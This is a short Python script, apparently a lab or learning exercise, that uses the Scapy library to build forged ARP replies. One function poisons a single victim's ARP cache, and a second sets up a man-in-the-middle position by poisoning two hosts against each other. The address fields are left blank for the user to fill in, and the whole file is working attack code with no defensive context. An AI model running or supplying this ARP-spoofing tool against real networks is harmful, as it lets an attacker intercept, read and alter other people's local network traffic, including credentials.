from scapy.all import *

def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp, iface = "enp0s3")
    
def oneWayPoisoning():
    macAttacker = ""
    ipAttacker = ""

    macVictim = ""
    ipVictim = ""

    ipToSpoof = ""
    
    arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof)
    
def mimAttack():
    macAttacker = ""
    ipAttacker = ""

    macVictim1 = ""
    ipVictim1 = ""
    
    macVictim2 = ""
    ipVictim2 = ""
    
    arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2)
    arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1)